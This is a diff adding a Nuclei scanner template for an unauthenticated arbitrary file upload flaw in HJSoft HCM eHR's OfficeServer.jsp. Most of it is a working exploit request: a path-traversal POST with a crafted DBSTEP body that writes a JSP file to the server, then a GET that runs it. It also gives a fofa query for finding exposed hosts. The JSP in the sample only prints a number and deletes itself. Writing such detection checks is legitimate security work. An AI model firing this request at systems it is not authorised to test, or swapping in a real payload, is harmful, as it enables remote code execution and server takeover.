@@ -1,0 +1,52 @@
+id: hjsoft-hcm-arbitrary-file-upload
+
+info:
+  name: HJSoft HCM eHR - Arbitrary File Upload
+  author: Co5mos
+  severity: critical
+  description: An arbitrary file upload vulnerability in the eHR OfficeServer.jsp interface of Hongjing, which allows remote attackers without authentication to exploit this vulnerability and upload any files. 
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/131902836
+  metadata:
+    max-request: 2
+    fofa-query: app="HJSOFT-HCM"
+  tags: hjsoft,hcm,fileupload
+
+variables:
+  str1: "{{rand_base(5)}}.jsp"
+
+http:
+  - raw:
+      - |
+        POST /w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ
+        OPTION=U0FWRUZJTEU=
+        currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
+        FILETYPE=Li5c{{base64("{{str1}}")}}
+        RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
+        originalFileId=wV66
+        originalCreateDate=wUghPB3szB3Xwg66
+        FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
+        needReadFile=yRWZdAS6
+        originalCreateDate=wLSGP4oEzLKAz4=iz=66
+
+        <% out.print(1111*2222);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+
+      - |
+        GET /{{str1}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '2468642'
+
+      - type: status
+        status:
+          - 200
